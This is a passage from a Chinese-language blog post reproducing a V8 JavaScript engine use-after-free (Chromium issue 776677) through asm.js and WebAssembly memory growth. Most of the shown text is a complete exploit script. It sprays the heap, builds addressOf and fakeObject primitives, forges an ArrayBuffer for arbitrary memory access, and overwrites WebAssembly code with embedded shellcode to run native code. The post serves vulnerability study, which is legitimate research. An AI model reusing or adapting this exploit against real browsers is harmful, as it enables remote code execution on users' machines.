<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function gc() &#123;</span><br><span class="line">   for (let i = 0; i &lt; 0x10; i++) &#123;</span><br><span class="line">      new ArrayBuffer(0x1000000);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">//corrupted_array后方的内存释放掉，然后我们将其他对象堆喷到此处</span><br><span class="line">victim_array[next_array_idx] = null;</span><br><span class="line">gc();</span><br><span class="line">//堆喷</span><br><span class="line">var obj = &#123;&#125;;</span><br><span class="line">array = [obj];</span><br><span class="line">array.length = 0x2000;</span><br><span class="line">array.fill(obj);</span><br><span class="line"></span><br><span class="line">for(var i = 0;i &lt; victim_array.length;i++)&#123;</span><br><span class="line">   victim_array[i] = array.slice(0,array.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里，我们<code>victim_array[next_array_idx] = null;</code>使得该处对象失去了引用，然后通过申请大量的内存<code>new ArrayBuffer(0x1000000);</code>触发了垃圾回收器将<code>next_array</code>的内存回收，这样<code>corrupted_array</code>后方的内存就空闲了，然后我们堆喷多个<code>HOLEY_ELEMENTS</code>类型的<code>Array</code>，因为该<code>Array</code>存储着的是对象的指针，因此，我们结合<code>corrupted_array</code>和该处的<code>Array</code>，就可以构造<code>addressOf</code>原语和<code>fakeObject</code>原语。其构造布置比较简单，这里不再叙述。然后后续利用也比较容易了。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line">function gc() &#123;</span><br><span class="line">   for (let i = 0; i &lt; 0x10; i++) &#123;</span><br><span class="line">      new ArrayBuffer(0x1000000);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var buf = new ArrayBuffer(0x8);</span><br><span class="line">var dv = new DataView(buf);</span><br><span class="line"></span><br><span class="line">function p64f(value1,value2) &#123;</span><br><span class="line">   dv.setUint32(0,value1,true);</span><br><span class="line">   dv.setUint32(0x4,value2,true);</span><br><span class="line">   return dv.getFloat64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function u64f(value) &#123;</span><br><span class="line">   dv.setFloat64(0,value,true);</span><br><span class="line">   return [dv.getUint32(0,true),dv.getUint32(4,true)];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//距离不是固定的，因此需要将所有可能的距离都赋值,我们要修改Element的length和第一个元素</span><br><span class="line">let loop = &quot;&quot;;</span><br><span class="line">for(let i = 0; i &lt; 0xd0; i++) &#123;</span><br><span class="line">    loop += `fl[$&#123;0x21041 + 0x100 * i&#125;] = x;fl[$&#123;0x21042 + 0x100 * i&#125;] = x;`;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let eval_str = `</span><br><span class="line">function module(stdlib, foreign, buffer) &#123;</span><br><span class="line">    &quot;use asm&quot;;</span><br><span class="line">    var fl = new stdlib.Uint32Array(buffer);</span><br><span class="line">    function foo(x) &#123;</span><br><span class="line">        x = x | 0;</span><br><span class="line">        $&#123;loop&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return foo;</span><br><span class="line">&#125;</span><br><span class="line">`</span><br><span class="line">eval(eval_str);</span><br><span class="line"></span><br><span class="line">//堆喷</span><br><span class="line">var victim_array = [];</span><br><span class="line">victim_array.length = 0x750;</span><br><span class="line">var array = [1.1];</span><br><span class="line">array.length = 0x10000;</span><br><span class="line">array.fill(2.2);</span><br><span class="line">function spray_heap() &#123;</span><br><span class="line">    for(var i = 0;i &lt; victim_array.length;i++)&#123;</span><br><span class="line">        victim_array[i] = array.slice(0,array.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var global = &#123;Uint32Array:Uint32Array&#125;;</span><br><span class="line">var env = &#123;&#125;;</span><br><span class="line">var memory = new WebAssembly.Memory(&#123;initial:200&#125;);</span><br><span class="line">var buffer = memory.buffer;</span><br><span class="line">var evil_f = module(global,env,buffer);</span><br><span class="line"></span><br><span class="line">evil_f(1);</span><br><span class="line">//%DebugPrint(memory);</span><br><span class="line">//%SystemBreak();</span><br><span class="line">//evil_f(1);</span><br><span class="line">//制造UAF</span><br><span class="line">memory.grow(1);</span><br><span class="line">//%DebugPrint(buffer);</span><br><span class="line"></span><br><span class="line">//重写对象的toString函数，这样在执行ToNumber时可以同时触发Hpeap Spray</span><br><span class="line">trigger = &#123;&#125;;</span><br><span class="line">trigger.toString = function()&#123;</span><br><span class="line">    spray_heap();</span><br><span class="line">    return 0xffffffff;</span><br><span class="line">&#125;;</span><br><span class="line">evil_f(trigger);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//找到那个能够被我们UAF控制的Array</span><br><span class="line">var corrupted_array = undefined;</span><br><span class="line">for(var i = 0; i &lt; victim_array.length; i++) &#123;</span><br><span class="line">    tmp = victim_array[i];</span><br><span class="line">    if (tmp[0] !== 2.2) &#123;</span><br><span class="line">        console.log(&quot;[+] array at : &quot; + i);</span><br><span class="line">        corrupted_array = victim_array[i];</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//寻找corrupted_array的后面是哪个Array对象的elements</span><br><span class="line">var next_array_idx = undefined;</span><br><span class="line">var tag = p64f(0x12345678,0x78563412)</span><br><span class="line">if (corrupted_array != undefined) &#123;</span><br><span class="line">    //由于elements的length被我们修改，因此在这里加大length，elements仍然不变，相当于构造了一个oob数组</span><br><span class="line">    corrupted_array.length = 0x200000;</span><br><span class="line">    let leaked_idx = undefined;</span><br><span class="line">    if (corrupted_array[0x20000] == 2.2) &#123;</span><br><span class="line">        corrupted_array[0x20000] = tag; //设置一个标记</span><br><span class="line">	//搜索标记</span><br><span class="line">        for(let i = 0; i &lt; victim_array.length; i++) &#123;</span><br><span class="line">            tmp = victim_array[i];</span><br><span class="line">            if (tmp[0] == tag) &#123;</span><br><span class="line">                tmp = undefined;</span><br><span class="line">                console.log(&quot;[+] next array at : &quot; + i);</span><br><span class="line">                next_array_idx = i;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    console.log(&quot;[-] fail&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//%DebugPrint(victim_array[next_array_idx]);</span><br><span class="line">//corrupted_array后方的内存释放掉，然后我们将其他对象堆喷到此处</span><br><span class="line">victim_array[next_array_idx] = null;</span><br><span class="line">gc();</span><br><span class="line">//堆喷</span><br><span class="line">var obj = &#123;&#125;;</span><br><span class="line">array = [obj];</span><br><span class="line">array.length = 0x2000;</span><br><span class="line">array.fill(obj);</span><br><span class="line"></span><br><span class="line">for(var i = 0;i &lt; victim_array.length;i++)&#123;</span><br><span class="line">   victim_array[i] = array.slice(0,array.length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function addressOf(m_obj) &#123;</span><br><span class="line">   for(var i = 0;i &lt; victim_array.length;i++)&#123;</span><br><span class="line">      victim_array[i][0] = m_obj;</span><br><span class="line">   &#125;</span><br><span class="line">   return u64f(corrupted_array[0x20000])[0] - 0x1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var tag = &#123;a:1.1&#125;;</span><br><span class="line">var tag_addr = addressOf(tag);</span><br><span class="line">//print(&quot;tag_addr=&quot; + tag_addr.toString(16));</span><br><span class="line"></span><br><span class="line">//寻找corrupted_array后面是哪一个Array</span><br><span class="line">next_array_idx = undefined;</span><br><span class="line">corrupted_array[0x20001] = p64f(tag_addr+0x1,0x123456);</span><br><span class="line">//搜索标记</span><br><span class="line">for(let i = 0; i &lt; victim_array.length; i++) &#123;</span><br><span class="line">   tmp = victim_array[i];</span><br><span class="line">   if (tmp[2] == tag) &#123;</span><br><span class="line">      tmp = undefined;</span><br><span class="line">      console.log(&quot;[+] next array at : &quot; + i);</span><br><span class="line">      next_array_idx = i;</span><br><span class="line">      break;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (next_array_idx == undefined) &#123;</span><br><span class="line">   throw &quot;error&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function fakeObject(addr) &#123;</span><br><span class="line">   corrupted_array[0x20000] = p64f(addr+0x1,0x123456);</span><br><span class="line">   return victim_array[next_array_idx][0];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);</span><br><span class="line">const shellcode = new Uint32Array([795371626, 1752379183, 1852400175, 23651209, 2164326657, 1769088052, 3375431937, 1493461585, 2303844609, 1792160225, 2160941067]);</span><br><span class="line">var wasmModule = new WebAssembly.Module(wasmCode);</span><br><span class="line">var wasmInstance = new WebAssembly.Instance(wasmModule);</span><br><span class="line">var func = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line">var wasm_shellcode_ptr_addr = addressOf(func) + 0x18;</span><br><span class="line">print(&#x27;wasm_shellcode_ptr_addr=&#x27; + wasm_shellcode_ptr_addr.toString(16));</span><br><span class="line"></span><br><span class="line">var proto_addr = addressOf(ArrayBuffer.prototype);</span><br><span class="line"></span><br><span class="line">var faker = [1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];</span><br><span class="line">var faker_addr = addressOf(faker);</span><br><span class="line"></span><br><span class="line">//fake a ArrayBuffer Map</span><br><span class="line">faker[0] = p64f(0,0x0f0a000a);</span><br><span class="line">faker[1] = p64f(0x000900c6,0x082003ff);</span><br><span class="line">faker[2] = p64f(proto_addr,0);</span><br><span class="line"></span><br><span class="line">var map_addr = faker_addr + 0x20;</span><br><span class="line">print(&quot;map_addr=&quot; + map_addr.toString(16));</span><br><span class="line">//fake a ArrayBuffer</span><br><span class="line">faker[4] = p64f(map_addr+0x1,0x3b90412d);</span><br><span class="line">faker[5] = p64f(0x3b90412d,0x100);</span><br><span class="line">faker[6] = p64f(wasm_shellcode_ptr_addr,0);</span><br><span class="line">faker[7] = p64f(0x800,4);</span><br><span class="line"></span><br><span class="line">var fake_arr_buf = fakeObject(faker_addr + 0x40);</span><br><span class="line"></span><br><span class="line">var adv = new DataView(fake_arr_buf);</span><br><span class="line">var wasm_shellcode_addr = adv.getUint32(0,true) + 0x3f;</span><br><span class="line">print(&#x27;wasm_shellcode_addr=&#x27; + wasm_shellcode_addr.toString(16));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">faker[6] = p64f(wasm_shellcode_addr,wasm_shellcode_addr);</span><br><span class="line"></span><br><span class="line">//%SystemBreak();</span><br><span class="line">//替换wasm的shellcode</span><br><span class="line">for (var i=0;i&lt;shellcode.length;i++) &#123;</span><br><span class="line">   adv.setUint32(i*4,shellcode[i],true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//%SystemBreak();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func();</span><br></pre></td></tr></table></figure>

<h2 id="0x04-感想"><a href="#0x04-感想" class="headerlink" title="0x04 感想"></a>0x04 感想</h2><p>本次漏洞复现，学习了很多新知识，对于V8 UAF方面的漏洞还是第一次接触，结合<code>Heap Spray</code>也是第一次，收获比较大。</p>
<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/code_for_free/article/details/53674210">asm.js：面向未来的开发</a><br><a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2017/09/asmjs_emscripten.html">asm.js 和 Emscripten 入门教程</a><br><a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/chromium/issues/detail?id=776677">Issue 776677: Security: V8:Use After Free Leads to Remote Code Execution</a></p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/JS%E5%BC%95%E6%93%8E%E6%BC%8F%E6%B4%9E/" rel="tag"># JS引擎漏洞</a>
              <a href="/tags/%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/" rel="tag"># 类型混淆</a>
              <a href="/tags/heap-spray/" rel="tag"># heap spray</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/03/19/issue-941743/" rel="prev" title="issue_941743">
      <i class="fa fa-chevron-left"></i> issue_941743
    </a></div>
      <div class="post-nav-item">
    <a href="/2021/04/27/virtualbox-hgcm/" rel="next" title="VirtualBox HGCM协议研究">
      VirtualBox HGCM协议研究 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">0x01 前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#asm-js"><span class="nav-number">2.1.</span> <span class="nav-text">asm.js</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">0x02 漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#patch%E5%88%86%E6%9E%90"><span class="nav-number">3.1.</span> <span class="nav-text">patch分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#asm-js%E7%9A%84UAF%E6%88%90%E5%9B%A0%E5%88%86%E6%9E%90"><span class="nav-number">3.2.</span> <span class="nav-text">asm.js的UAF成因分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">0x03 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">4.1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%95%E6%97%B6%E8%BF%9B%E8%A1%8C-Heap-Spray"><span class="nav-number">4.2.</span> <span class="nav-text">何时进行 Heap Spray</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">4.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E6%84%9F%E6%83%B3"><span class="nav-number">5.</span> <span class="nav-text">0x04 感想</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%8F%82%E8%80%83"><span class="nav-number">6.</span> <span class="nav-text">0x05 参考</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ha1vk</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">234</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">145</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ha1vk</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>


        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
